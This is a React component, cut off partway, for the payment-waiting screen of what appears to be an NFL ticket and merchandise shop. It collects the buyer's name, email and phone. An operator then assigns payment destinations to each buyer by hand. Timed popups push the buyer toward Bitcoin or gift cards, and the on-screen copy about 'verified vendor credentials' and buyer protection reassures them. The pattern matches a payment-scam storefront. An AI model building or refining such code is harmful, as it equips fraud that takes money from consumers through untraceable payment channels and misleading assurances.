import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "motion/react";
import { 
  ShieldCheck, 
  Clock, 
  Copy, 
  Check, 
  AlertCircle, 
  Loader2, 
  Sparkles, 
  Radio, 
  CreditCard, 
  ArrowRight, 
  Gift, 
  QrCode,
  Building2,
  Smartphone,
  CheckCircle2,
  Lock,
  UserCheck,
  User,
  Mail,
  Phone,
  Bell,
  Send,
  MessageSquare
} from "lucide-react";
import { 
  PaymentMethodType, 
  AdminPaymentDetails, 
  PaymentSession,
  createOrUpdatePaymentSession, 
  subscribeToPaymentSession,
  submitCustomerPayment,
  syncSessionReceipts,
  findRecentDispatchedSessionForCustomer,
  subscribeToCustomerDispatchedSession,
  subscribeToControlRoomPaymentPresets,
  buildAdminDetailsFromPresets,
  dispatchPaymentDetailsToSession,
  sendSessionMailMessage,
  markGuestMessagesAsRead,
  playGuestNotificationChime,
  SAVED_PAYMENT_SESSIONS_KEY,
  SAVED_SESSIONS_EVENT
} from "../../services/paymentControlService";
import { PaymentReceiptUploader } from "./PaymentReceiptUploader";
import { TenMinuteFollowUpModal } from "./TenMinuteFollowUpModal";

interface CustomerPaymentWaitingTerminalProps {
  sessionId: string;
  selectedMethod: PaymentMethodType;
  amount: number;
  orderReference?: string;
  customerName?: string;
  customerEmail?: string;
  customerPhone?: string;
  itemTitle: string;
  itemType: "ticket" | "experience" | "merchandise" | "deposit";
  onCustomerDetailsChange?: (details: { name: string; email: string; phone: string }) => void;
  onSwitchToGiftCard?: () => void;
  onSwitchToMethod?: (method: PaymentMethodType) => void;
  onReceiptsChange?: (receiptUrl: string, receiptUrls: string[]) => void;
  onPaymentSubmitted?: (referenceTag: string, receiptUrl: string, receiptUrls?: string[]) => void;
}

export const CustomerPaymentWaitingTerminal: React.FC<CustomerPaymentWaitingTerminalProps> = ({
  sessionId,
  selectedMethod,
  amount,
  orderReference,
  customerName,
  customerEmail,
  customerPhone,
  itemTitle,
  itemType,
  onCustomerDetailsChange,
  onSwitchToGiftCard,
  onSwitchToMethod,
  onReceiptsChange,
  onPaymentSubmitted
}) => {
  const [session, setSession] = useState<PaymentSession | null>(null);
  const [activeSessionId, setActiveSessionId] = useState<string>(sessionId);
  const [recoveredFromPrevious, setRecoveredFromPrevious] = useState(false);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const [referenceTag, setReferenceTag] = useState("");
  const [receiptUrl, setReceiptUrl] = useState("");
  const [receiptUrls, setReceiptUrls] = useState<string[]>([]);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitError, setSubmitError] = useState<string | null>(null);
  const [replyInput, setReplyInput] = useState("");
  const [isSendingReply, setIsSendingReply] = useState(false);
  const [replyFeedback, setReplyFeedback] = useState<string | null>(null);
  const [showTenMinutePopup, setShowTenMinutePopup] = useState(false);
  const [isSwitchingMethod, setIsSwitchingMethod] = useState(false);
  const [nowMs, setNowMs] = useState(() => Date.now());
  const [alertStatus, setAlertStatus] = useState<"default" | "granted" | "denied">(() => {
    if (typeof window !== "undefined" && "Notification" in window) {
      return Notification.permission as "default" | "granted" | "denied";
    }
    return "default";
  });

  // Internal state for customer inputs so customer can fill details here or via parent
  const [internalName, setInternalName] = useState<string>(() => {
    return customerName || localStorage.getItem("nfl_guest_sender_name") || "";
  });
  const [internalEmail, setInternalEmail] = useState<string>(() => {
    return customerEmail || localStorage.getItem("nfl_guest_buyer_email") || "";
  });
  const [internalPhone, setInternalPhone] = useState<string>(() => {
    return customerPhone || localStorage.getItem("nfl_guest_buyer_phone") || "";
  });

  // Sync activeSessionId & clear stale method state whenever sessionId or selectedMethod changes
  useEffect(() => {
    if (sessionId) {
      setActiveSessionId(sessionId);
    }
    setRecoveredFromPrevious(false);
    setSubmitError(null);
    setCopiedKey(null);
    setReferenceTag("");
    setSession((prev) => {
      if (!prev) return null;
      const matchesMethod =
        prev.paymentMethod === selectedMethod &&
        (!prev.adminPaymentDetails?.method || prev.adminPaymentDetails.method === selectedMethod);
      return matchesMethod ? prev : null;
    });
  }, [sessionId, selectedMethod]);

  const isGeneric = (name?: string) => {
    if (!name) return true;
    const n = name.trim().toLowerCase();
    return !n || ["customer", "vip guest", "ticket guest", "guest", "vip member", "patriots collector"].includes(n);
  };

  useEffect(() => {
    if (customerName && !isGeneric(customerName)) {
      setInternalName(customerName);
    }
  }, [customerName]);

  useEffect(() => {
    if (customerEmail && customerEmail.includes("@")) {
      setInternalEmail(customerEmail);
    }
  }, [customerEmail]);

  useEffect(() => {
    if (customerPhone) {
      setInternalPhone(customerPhone);
    }
  }, [customerPhone]);

  const effectiveName = internalName.trim();
  const effectiveEmail = internalEmail.trim();
  const effectivePhone = internalPhone.trim();

  // Identified customer gate: must have filled a genuine name (>= 2 chars) and email
  const isIdentified = Boolean(
    effectiveName.length >= 2 && 
    !isGeneric(effectiveName) && 
    effectiveEmail.length >= 3 && 
    effectiveEmail.includes("@")
  );

  const handleDetailsUpdate = (name: string, email: string, phone: string) => {
    setInternalName(name);
    setInternalEmail(email);
    setInternalPhone(phone);
    if (name && !isGeneric(name)) {
      localStorage.setItem("nfl_guest_sender_name", name);
    }
    if (email) {
      localStorage.setItem("nfl_guest_buyer_email", email);
    }
    if (phone) {
      localStorage.setItem("nfl_guest_buyer_phone", phone);
    }
    if (onCustomerDetailsChange) {
      onCustomerDetailsChange({ name, email, phone });
    }
  };

  // Check for previous dispatched reply when customer name and payment method are selected.
  // If operator has responded before, the response immediately pops up!
  useEffect(() => {
    let isMounted = true;
    const normName = effectiveName.toLowerCase();
    const hasValidIdentity = !isGeneric(effectiveName) && effectiveName.length >= 2;

    if (!hasValidIdentity) {
      setRecoveredFromPrevious(false);
      return;
    }

    const cacheKey = `nfl_dispatched_${selectedMethod}_${normName}`;

    // 1. Instant local cache check (0ms response)
    try {
      const cached = localStorage.getItem(cacheKey);
      if (cached) {
        const parsed = JSON.parse(cached);
        const cacheMatchesMethod = !parsed?.method || parsed.method === selectedMethod;
        if (parsed && cacheMatchesMethod && (parsed.identifier || parsed.accountNumber || parsed.bankName)) {
          setSession({
            id: sessionId || activeSessionId,
            orderId: orderReference || sessionId,
            customerName: effectiveName,
            customerEmail: effectiveEmail,
            customerPhone: effectivePhone,
            itemType,
            itemTitle,
            amount,
            paymentMethod: selectedMethod,
            status: "details_provided",
            adminPaymentDetails: parsed,
            createdAt: Date.now(),
            updatedAt: Date.now()
          });
          setRecoveredFromPrevious(true);
        } else {
          setRecoveredFromPrevious(false);
        }
      } else {
        setRecoveredFromPrevious(false);
      }
    } catch (e) {
      // ignore cache parse error
    }

    // 2. Query Firestore for previously dispatched session by the operator for this customer & method
    async function checkPreviousDispatchedSession() {
      try {
        const previousSession = await findRecentDispatchedSessionForCustomer(
          effectiveName,
          selectedMethod,
          effectiveEmail
        );
        if (previousSession && isMounted) {
          setSession(previousSession);
          setActiveSessionId(previousSession.id);
          setRecoveredFromPrevious(true);
          if (previousSession.adminPaymentDetails) {
            localStorage.setItem(cacheKey, JSON.stringify(previousSession.adminPaymentDetails));
          }
          // Also link current session ID in Firestore so both records reflect the dispatched details
          if (sessionId && sessionId !== previousSession.id) {
            createOrUpdatePaymentSession({
              id: sessionId,
              orderId: orderReference || sessionId,
              customerName: effectiveName,
              customerEmail: effectiveEmail,
              customerPhone: effectivePhone,
              itemType,
              itemTitle,
              amount,
              paymentMethod: selectedMethod,
              status: "details_provided",
              adminPaymentDetails: previousSession.adminPaymentDetails
            }).catch(err => console.warn("Sync existing details to new session error:", err));
          }
        }
      } catch (err) {
        console.warn("Error finding previous dispatched session:", err);
      }
    }

    checkPreviousDispatchedSession();

    // 3. Set up real-time listener for any dispatched sessions matching this customer and method
    const unsubCustomer = subscribeToCustomerDispatchedSession(
      effectiveName,
      selectedMethod,
      (dispatchedSession) => {
        if (dispatchedSession && isMounted) {
          setSession(dispatchedSession);
          setActiveSessionId(dispatchedSession.id);
          setRecoveredFromPrevious(true);
          if (dispatchedSession.adminPaymentDetails) {
            localStorage.setItem(cacheKey, JSON.stringify(dispatchedSession.adminPaymentDetails));
          }
        }
      },
      effectiveEmail
    );

    return () => {
      isMounted = false;
      unsubCustomer();
    };
  }, [effectiveName, selectedMethod, effectiveEmail, effectivePhone, sessionId, activeSessionId, amount, itemTitle, itemType, orderReference]);

  // Real-time listener and session creation: ONLY trigger if customer is identified!
  useEffect(() => {
    if (!isIdentified) return;
    const targetSessionId = activeSessionId || sessionId;
    if (!targetSessionId) return;

    const saveLocalBookmark = (statusVal: string) => {
      try {
        const raw = localStorage.getItem("nfl_saved_payment_sessions");
        const existing: any[] = raw ? JSON.parse(raw) : [];
        const entry = {
          id: targetSessionId,
          orderId: orderReference || targetSessionId,
          customerName: effectiveName,
          customerEmail: effectiveEmail,
          paymentMethod: selectedMethod,
          itemTitle,
          amount,
          status: statusVal,
          updatedAt: Date.now()
        };
        const filtered = Array.isArray(existing)
          ? existing.filter((x) => x && x.id !== targetSessionId)
          : [];
        localStorage.setItem(
          SAVED_PAYMENT_SESSIONS_KEY,
          JSON.stringify([entry, ...filtered].slice(0, 6))
        );
        window.dispatchEvent(new Event(SAVED_SESSIONS_EVENT));
      } catch {
        // ignore storage quota errors
      }
    };

    saveLocalBookmark("awaiting_admin_details");

    createOrUpdatePaymentSession({
      id: targetSessionId,
      orderId: orderReference || targetSessionId,
      customerName: effectiveName,
      customerEmail: effectiveEmail,
      customerPhone: effectivePhone,
      itemType,
      itemTitle,
      amount,
      paymentMethod: selectedMethod
    }).catch(err => console.warn("Init payment session failed:", err));

    const unsubscribe = subscribeToPaymentSession(targetSessionId, (updatedSession) => {
      if (updatedSession) {
        // Guard against stale snapshots belonging to a previously selected payment method
        const sessionMethodMatches = !updatedSession.paymentMethod || updatedSession.paymentMethod === selectedMethod;
        const detailsMethodMatches = !updatedSession.adminPaymentDetails?.method || updatedSession.adminPaymentDetails.method === selectedMethod;
        if (!sessionMethodMatches) {
          return;
        }
        const safeSession: PaymentSession = detailsMethodMatches
          ? updatedSession
          : {
              ...updatedSession,
              adminPaymentDetails: null,
              status: updatedSession.status === "payment_submitted" ? "payment_submitted" : "awaiting_admin_details"
            };
        setSession(safeSession);
        saveLocalBookmark(safeSession.status || "awaiting_admin_details");
        if (safeSession.adminPaymentDetails && effectiveName) {
          const normName = effectiveName.trim().toLowerCase();
          const cacheKey = `nfl_dispatched_${selectedMethod}_${normName}`;
          localStorage.setItem(cacheKey, JSON.stringify(safeSession.adminPaymentDetails));
        }
        const sessionImgs = Array.from(new Set([
          ...(Array.isArray(safeSession.receiptImages) ? safeSession.receiptImages : []),
          ...(safeSession.receiptUrl ? [safeSession.receiptUrl] : []),
          ...(safeSession.receiptImage ? [safeSession.receiptImage] : [])
        ].filter((u): u is string => typeof u === "string" && u.trim().length > 0)));
        if (sessionImgs.length > 0 && receiptUrls.length === 0) {
          setReceiptUrls(sessionImgs);
          setReceiptUrl(sessionImgs[0]);
          onReceiptsChange?.(sessionImgs[0], sessionImgs);
        }
      }
    });

    return () => unsubscribe();
  }, [activeSessionId, sessionId, selectedMethod, amount, effectiveName, effectiveEmail, effectivePhone, itemTitle, itemType, orderReference, isIdentified]);

  // Auto-dispatch saved Control Room presets in real time (e.g., saved Bitcoin address)
  useEffect(() => {
    if (!isIdentified || selectedMethod === "giftcard") return;
    const targetSessionId = activeSessionId || sessionId;
    if (!targetSessionId) return;

    const alreadyHasDetails = Boolean(
      session?.paymentMethod === selectedMethod &&
      session?.adminPaymentDetails &&
        (!session.adminPaymentDetails.method || session.adminPaymentDetails.method === selectedMethod) &&
        (session.adminPaymentDetails.identifier ||
          session.adminPaymentDetails.accountNumber ||
          session.adminPaymentDetails.bankName)
    );
    if (alreadyHasDetails || session?.status === "payment_submitted") return;

    const unsubscribePresets = subscribeToControlRoomPaymentPresets((presets) => {
      if (!presets || presets.autoDispatchEnabled === false) return;
      const presetDetails = buildAdminDetailsFromPresets(selectedMethod, presets);
      if (!presetDetails) return;

      setSession((prev) => {
        const hasDetailsForCurrentMethod = Boolean(
          prev?.paymentMethod === selectedMethod &&
          prev?.adminPaymentDetails &&
            (!prev.adminPaymentDetails.method || prev.adminPaymentDetails.method === selectedMethod) &&
            (prev.adminPaymentDetails.identifier ||
              prev.adminPaymentDetails.accountNumber ||
              prev.adminPaymentDetails.bankName)
        );
        if (hasDetailsForCurrentMethod || (prev?.paymentMethod === selectedMethod && prev?.status === "payment_submitted")) return prev;
        return {
          id: targetSessionId,
          orderId: orderReference || targetSessionId,
          customerName: effectiveName,
          customerEmail: effectiveEmail,
          customerPhone: effectivePhone,
          itemType,
          itemTitle,
          amount,
          paymentMethod: selectedMethod,
          status: "details_provided",
          adminPaymentDetails: presetDetails,
          createdAt: prev?.createdAt || Date.now(),
          updatedAt: Date.now()
        };
      });

      dispatchPaymentDetailsToSession(targetSessionId, presetDetails).catch((err) =>
        console.warn("Auto-dispatch preset error:", err)
      );
    });

    return () => unsubscribePresets();
  }, [
    isIdentified,
    selectedMethod,
    activeSessionId,
    sessionId,
    session?.adminPaymentDetails,
    session?.status,
    orderReference,
    effectiveName,
    effectiveEmail,
    effectivePhone,
    itemType,
    itemTitle,
    amount
  ]);

  const handleCopy = (text: string, key: string) => {
    if (!text) return;
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2500);
  };

  const handleReceiptsUpdated = (nextUrls: string[]) => {
    const clean = Array.from(new Set(nextUrls.filter((u): u is string => typeof u === "string" && u.trim().length > 0)));
    const primary = clean[0] || "";
    setReceiptUrls(clean);
    setReceiptUrl(primary);
    onReceiptsChange?.(primary, clean);
    onPaymentSubmitted?.(referenceTag.trim(), primary, clean);
    const targetSessionId = activeSessionId || sessionId;
    if (targetSessionId) {
      syncSessionReceipts(targetSessionId, clean).catch((err) =>
        console.warn("Session receipt sync warning:", err)
      );
    }
  };

  const handleConfirmAndProceed = async (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    setSubmitError(null);
    const effectiveImgs = receiptUrls.length > 0 ? receiptUrls : (receiptUrl ? [receiptUrl] : []);
    const primaryImg = effectiveImgs[0] || receiptUrl;
    if (!referenceTag.trim() && effectiveImgs.length === 0) {
      setSubmitError("Please provide your payment reference/tag or upload a transfer receipt.");
      return;
    }

    setIsSubmitting(true);
    try {
      const targetSessionId = activeSessionId || sessionId;
      await submitCustomerPayment(targetSessionId, referenceTag.trim(), primaryImg, effectiveImgs);
      if (onPaymentSubmitted) {
        onPaymentSubmitted(referenceTag.trim(), primaryImg, effectiveImgs);
      }
    } catch (err: any) {
      console.error(err);
      setSubmitError("Error confirming payment: " + (err?.message || String(err)));
    } finally {
      setIsSubmitting(false);
    }
  };

  // Mark admin messages as read when displayed in this terminal
  useEffect(() => {
    if (!session?.messages || session.messages.length === 0) return;
    const adminIds = session.messages.filter((m) => m.sender === "admin").map((m) => m.id);
    if (adminIds.length > 0) {
      markGuestMessagesAsRead(adminIds);
    }
  }, [session?.messages]);

  // Tick current time every 15s while waiting so 10-minute popup evaluates automatically
  useEffect(() => {
    if (!isIdentified) return;
    setNowMs(Date.now());
    const interval = setInterval(() => setNowMs(Date.now()), 15000);
    return () => clearInterval(interval);
  }, [isIdentified]);

  // Evaluate 30-second awaiting delay popup with 2-minute repeat after dismissal
  useEffect(() => {
    const targetId = activeSessionId || sessionId;
    const isStillAwaiting =
      isIdentified &&
      targetId &&
      (!session || (session.status === "awaiting_admin_details" && !session.adminPaymentDetails));

    if (!isStillAwaiting || !session?.createdAt) {
      setShowTenMinutePopup(false);
      return;
    }

    const createdMs = new Date(session.createdAt).getTime();
    const elapsed = createdMs > 0 ? nowMs - createdMs : 0;
    const thirtySecs = 30 * 1000;
    const twoMins = 2 * 60 * 1000;

    if (createdMs > 0 && elapsed >= thirtySecs) {
      try {
        const dismissedKey = `nfl_popup_dismissed_time_${targetId}`;
        const dismissedTimeStr = sessionStorage.getItem(dismissedKey);
        if (!dismissedTimeStr) {
          setShowTenMinutePopup(true);
        } else {
          const dismissedTime = Number(dismissedTimeStr);
          if (!isNaN(dismissedTime) && nowMs - dismissedTime >= twoMins) {
            setShowTenMinutePopup(true);
          }
        }
      } catch {
        setShowTenMinutePopup(true);
      }
    } else {
      setShowTenMinutePopup(false);
    }
  }, [isIdentified, activeSessionId, sessionId, session?.status, session?.adminPaymentDetails, session?.createdAt, nowMs]);

  const handleDismissTenMinutePopup = () => {
    const targetId = activeSessionId || sessionId;
    if (targetId) {
      try {
        sessionStorage.setItem(`nfl_popup_dismissed_time_${targetId}`, String(Date.now()));
      } catch {}
    }
    setShowTenMinutePopup(false);
  };

  const handleTenMinSwitchToBitcoin = async () => {
    handleDismissTenMinutePopup();
    if (onSwitchToMethod) {
      onSwitchToMethod("crypto");
      return;
    }
    const targetId = activeSessionId || sessionId;
    if (!targetId) return;
    setIsSwitchingMethod(true);
    try {
      await createOrUpdatePaymentSession({
        id: targetId,
        orderId: orderReference || targetId,
        customerName: effectiveName || "Guest",
        customerEmail: effectiveEmail || "",
        customerPhone: effectivePhone || "",
        itemType,
        itemTitle,
        amount,
        paymentMethod: "crypto"
      });
    } finally {
      setIsSwitchingMethod(false);
    }
  };

  const handleTenMinSwitchToGiftCard = () => {
    handleDismissTenMinutePopup();
    if (onSwitchToMethod) {
      onSwitchToMethod("giftcard");
    } else if (onSwitchToGiftCard) {
      onSwitchToGiftCard();
    }
  };

  const handleEnableSwiftAlerts = async () => {
    playGuestNotificationChime();
    if (typeof window !== "undefined" && "Notification" in window) {
      try {
        const perm = await Notification.requestPermission();
        setAlertStatus(perm as "default" | "granted" | "denied");
      } catch {
        setAlertStatus("default");
      }
    }
  };

  const handleSendGuestReply = async (e: React.FormEvent) => {
    e.preventDefault();
    const targetSessionId = activeSessionId || sessionId;
    if (!targetSessionId || !replyInput.trim()) return;
    setIsSendingReply(true);
    setReplyFeedback(null);
    try {
      await sendSessionMailMessage(targetSessionId, {
        sender: "customer",
        senderName: effectiveName || "Guest",
        body: replyInput.trim()
      });
      setReplyInput("");
      setReplyFeedback("Message sent directly to billing desk.");
      setTimeout(() => setReplyFeedback(null), 3000);
    } catch (err: any) {
      setReplyFeedback("Could not send note: " + (err?.message || "Please try again."));
    } finally {
      setIsSendingReply(false);
    }
  };

  const rawDetails: AdminPaymentDetails | undefined | null = session?.adminPaymentDetails;
  const detailsMatchSelectedMethod = Boolean(
    rawDetails &&
      (!session?.paymentMethod || session.paymentMethod === selectedMethod) &&
      (!rawDetails.method || rawDetails.method === selectedMethod)
  );
  const details: AdminPaymentDetails | undefined | null = detailsMatchSelectedMethod ? rawDetails : null;
  const isDetailsAvailable = Boolean(details && (details.identifier || details.accountNumber || details.bankName));

  return (
    <div className="space-y-4">
      {/* Real-time State Card */}
      <AnimatePresence mode="wait">
        {/* STATE 0: CUSTOMER DETAILS REQUIRED BEFORE REQUESTING PAYMENT DETAILS */}
        {!isIdentified && !isDetailsAvailable ? (
          <motion.div
            key="identification-required"
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -8 }}
            className="p-5 bg-zinc-950 border border-blue-500/30 rounded-2xl space-y-4 relative overflow-hidden"
          >
            <div className="flex items-center justify-between border-b border-white/5 pb-3">
              <div className="flex items-center gap-2">
                <div className="w-6 h-6 rounded-lg bg-blue-500/20 text-blue-400 flex items-center justify-center">
                  <UserCheck className="w-3.5 h-3.5" />
                </div>
                <span className="text-[10px] font-black uppercase tracking-wider text-blue-400">
                  Customer Details Required Before Requesting Destination
                </span>
              </div>
              <span className="text-[9px] font-mono font-bold text-zinc-500 uppercase bg-zinc-900 px-2 py-0.5 rounded border border-white/5">
                Ref: {orderReference || sessionId}
              </span>
            </div>

              <div className="space-y-1">
                <h4 className="text-xs font-black uppercase tracking-wider text-white">
                  Enter Your Name &amp; Email to Reserve Your Payment Details
                </h4>
                <p className="text-[11px] text-zinc-300 leading-relaxed">
                  No payment is charged here. Entering your name and email creates a private reference so our billing desk can assign your verified destination details—and lets you check back anytime without losing your booking.
                </p>
              </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 pt-1">
              <div className="space-y-1">
                <label className="text-[9px] font-black uppercase text-zinc-400 block">
                  Full Name / Sender Name <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <User className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-2.5" />
                  <input
                    type="text"
                    required
                    placeholder="e.g. John Doe"
                    value={internalName}
                    onChange={(e) => handleDetailsUpdate(e.target.value, internalEmail, internalPhone)}
                    className="w-full bg-zinc-900 border border-white/10 rounded-xl pl-9 pr-3 py-2 text-xs font-bold text-white focus:outline-none focus:ring-1 focus:ring-blue-500 uppercase"
                  />
                </div>
              </div>

              <div className="space-y-1">
                <label className="text-[9px] font-black uppercase text-zinc-400 block">
                  Email Address <span className="text-red-400">*</span>
                </label>
                <div className="relative">
                  <Mail className="w-3.5 h-3.5 text-zinc-500 absolute left-3 top-2.5" />
                  <input
                    type="email"
                    required
                    placeholder="name@example.com"
                    value={internalEmail}
                    onChange={(e) => handleDetailsUpdate(internalName, e.target.value, internalPhone)}
                    className="w-full bg-zinc-900 border border-white/10 rounded-xl pl-9 pr-3 py-2 text-xs font-bold text-white focus:outline-none focus:ring-1 focus:ring-blue-500 lowercase"
                  />
                </div>
              </div>
            </div>

            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pt-1">
              <p className="text-[10px] text-zinc-400">
                Your details are used strictly to issue your payment reference and match your verification receipt.
              </p>
              {onSwitchToGiftCard && (
                <button
                  type="button"
                  onClick={onSwitchToGiftCard}
                  className="px-3 py-1.5 bg-amber-500/10 hover:bg-amber-500/20 text-amber-400 font-black text-[9px] uppercase tracking-wider rounded-xl flex items-center gap-1.5 transition-all self-start sm:self-auto cursor-pointer"
                >
                  <Gift className="w-3 h-3" /> Pay With Gift Card (Instant)
                </button>
              )}
            </div>
          </motion.div>
        ) : !isDetailsAvailable ? (
          /* STATE 1: CALM, REASSURING VENDOR ASSIGNMENT STATE */
          <motion.div
            key="awaiting"
            initial={{ opacity: 0, y: 8 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -8 }}
            className="p-5 sm:p-6 bg-zinc-950 border border-sky-500/35 rounded-3xl space-y-5 relative overflow-hidden shadow-2xl"
          >
            {/* Prominent Active Processing Beacon Banner */}
            <div className="p-3.5 rounded-2xl bg-gradient-to-r from-blue-600/20 via-indigo-600/20 to-emerald-500/20 border border-sky-400/40 flex items-center justify-between gap-3 shadow-lg">
              <div className="flex items-center gap-3 min-w-0">
                <span className="relative flex h-3.5 w-3.5 shrink-0">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-sky-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-3.5 w-3.5 bg-sky-500"></span>
                </span>
                <div className="min-w-0">
                  <span className="text-[10px] font-black uppercase tracking-wider text-sky-300 block truncate">
                    ACTIVE PROCESSING IN QUEUE · VENDOR ASSIGNMENT UNDERWAY
                  </span>
                  <p className="text-xs text-white font-bold truncate">
                    Your request has been successfully processed and logged for priority desk review.
                  </p>
                </div>
              </div>
              <span className="px-2.5 py-1 rounded-xl bg-sky-500/20 border border-sky-400/30 text-sky-200 font-mono text-[10px] font-bold shrink-0">
                LIVE SYNC
              </span>
            </div>

            {/* Header & Zero-Charge Guarantee */}
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-white/10 pb-3.5">
              <div className="flex items-center gap-2.5">
                <div className="w-8 h-8 rounded-xl bg-emerald-500/15 border border-emerald-500/30 text-emerald-400 flex items-center justify-center shrink-0">
                  <ShieldCheck className="w-4 h-4" />
                </div>
                <div>
                  <h4 className="text-xs font-black uppercase tracking-wider text-white">
                    Preparing Your Verified Vendor Credentials
                  </h4>
                  <p className="text-[11px] text-emerald-300 font-medium">
                    $0.00 charged yet · Nothing is deducted until you review and send payment
                  </p>
                </div>
              </div>

              <div className="flex items-center gap-2 self-start sm:self-auto">
                <span className="text-[10px] font-mono text-zinc-300">
                  Ref: <strong className="text-white select-all">{activeSessionId || sessionId}</strong>
                </span>
                <button
                  type="button"
                  onClick={() => handleCopy(activeSessionId || sessionId, "sessionRef")}
                  className="px-2.5 py-1.5 rounded-lg bg-zinc-900 hover:bg-zinc-800 border border-white/10 text-[10px] font-bold text-zinc-200 flex items-center gap-1 transition-colors cursor-pointer"
                >
                  {copiedKey === "sessionRef" ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>{copiedKey === "sessionRef" ? "Copied" : "Copy Ref"}</span>
                </button>
              </div>
            </div>

            {/* 3-Step Clear Progress */}
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              <div className="p-3 bg-emerald-500/10 border border-emerald-500/25 rounded-xl space-y-1">
                <div className="flex items-center gap-1.5 text-[10px] font-black uppercase text-emerald-300">
                  <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
                  <span>1. Request Saved</span>
                </div>
                <p className="text-[11px] text-zinc-300 leading-snug">
                  Logged for <strong className="text-white">{effectiveName}</strong> ({selectedMethod.toUpperCase()} · ${amount.toLocaleString()}).
                </p>
              </div>

              <div className="p-3 bg-blue-500/10 border border-blue-500/30 rounded-xl space-y-1">
                <div className="flex items-center gap-1.5 text-[10px] font-black uppercase text-blue-300">
                  <Clock className="w-3.5 h-3.5 text-blue-400" />
                  <span>2. Assigning Vendor</span>
                </div>
                <p className="text-[11px] text-zinc-300 leading-snug">
                  Billing desk is issuing your dedicated destination details (usually <strong className="text-white">1–3 mins</strong>).
                </p>
              </div>

              <div className="p-3 bg-zinc-900/70 border border-white/10 rounded-xl space-y-1">
                <div className="flex items-center gap-1.5 text-[10px] font-black uppercase text-zinc-300">
                  <Lock className="w-3.5 h-3.5 text-zinc-400" />
                  <span>3. Review &amp; Pay Safely</span>
                </div>
                <p className="text-[11px] text-zinc-400 leading-snug">
                  Inspect recipient details first, then send and upload your receipt.
                </p>
              </div>
            </div>

            {/* Honest Buyer-Protection & Check-Back Explanation */}
            <div className="border-t border-white/10 pt-4 space-y-2.5 text-[11px] text-zinc-300 leading-relaxed">
              <p>
                <strong className="text-white">Why are credentials assigned individually?</strong>{" "}
                For your security and payment protection, we do not expose public vendor accounts that can hit transfer limits or cause misrouted payments. Instead, a billing concierge assigns a dedicated, verified {selectedMethod.toUpperCase()} destination matched to your exact order.
              </p>
              <p>
                <strong className="text-emerald-300">Safe to step away &amp; check back anytime:</strong>{" "}
                You do not need to wait on this screen. Your request is saved under <span className="font-mono text-white">{activeSessionId || sessionId}</span> and <span className="text-white">{effectiveEmail}</span>. Whenever you return—either by opening <strong className="text-white">Check Ticket / Track Order</strong> with your email or Reference ID, or by re-entering your name &amp; email here—your assigned payment details will pop up immediately.
              </p>
            </div>

            {/* Direct Desk Inbox & Swift Alerts (No Sign-In Needed) */}
            <div className="bg-zinc-900/75 border border-sky-500/25 rounded-2xl p-4 space-y-3">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-white/10 pb-2.5">
                <div className="flex items-center gap-2">
                  <div className="w-6 h-6 rounded-lg bg-sky-500/15 border border-sky-500/30 text-sky-400 flex items-center justify-center shrink-0">
                    <Mail className="w-3.5 h-3.5" />
                  </div>
                  <div>
                    <span className="text-[10px] font-black uppercase tracking-wider text-sky-300 block">
                      Direct Concierge Inbox ({session?.messages?.length || 0})
                    </span>
                    <span className="text-[10px] text-zinc-400 block">
                      Live messages from our desk appear here instantly — no login or external email required
                    </span>
                  </div>
                </div>

                <button
                  type="button"
                  onClick={handleEnableSwiftAlerts}
                  className={`px-3 py-1.5 rounded-xl text-[10px] font-black uppercase tracking-wider flex items-center gap-1.5 transition-all cursor-pointer self-start sm:self-auto border ${
                    alertStatus === "granted"
                      ? "bg-emerald-500/15 border-emerald-500/35 text-emerald-300"
                      : "bg-sky-500/15 hover:bg-sky-500/25 border-sky-500/35 text-sky-300"
                  }`}
                >
                  <Bell className="w-3.5 h-3.5" />
                  <span>{alertStatus === "granted" ? "Swift Alerts Active" : "Enable Sound & Alert"}</span>
                </button>
              </div>

              {session?.messages && session.messages.length > 0 ? (
                <div className="space-y-2 max-h-52 overflow-y-auto pr-1">
                  {session.messages.map((m) => (
                    <div
                      key={m.id}
                      className={`p-3 rounded-xl border text-xs space-y-1 ${
                        m.sender === "admin"
                          ? "bg-sky-500/10 border-sky-500/30 text-zinc-100"
                          : "bg-zinc-950/90 border-white/10 text-zinc-300"
                      }`}
                    >
                      <div className="flex items-center justify-between gap-2 text-[9px] font-black uppercase tracking-wider">
                        <span className={m.sender === "admin" ? "text-sky-300" : "text-indigo-300"}>
                          {m.sender === "admin" ? (m.senderName || "Billing Concierge Desk") : "You"}
                        </span>
                        <span className="text-zinc-500 font-mono">
                          {new Date(m.createdAt).toLocaleTimeString([], { hour: "2-digit", minute: "2-digit" })}
                        </span>
                      </div>
                      {m.subject && (
                        <p className="text-[11px] font-bold text-white">{m.subject}</p>
                      )}
                      <p className="text-[11px] text-zinc-200 leading-relaxed whitespace-pre-wrap">{m.body}</p>
                    </div>
                  ))}
                </div>
              ) : (
                <p className="text-[11px] text-zinc-400 leading-relaxed">
                  If vendor verification takes slightly longer than usual, our billing desk will send a direct update right into this inbox and alert your screen immediately.
                </p>
              )}

              {/* Inline Guest Reply without sign-in */}
              <form onSubmit={handleSendGuestReply} className="flex flex-col sm:flex-row gap-2 pt-1">
                <input
                  type="text"
                  placeholder="Send a quick note or question to our desk (no sign-in needed)..."
                  value={replyInput}
                  onChange={(e) => setReplyInput(e.target.value)}
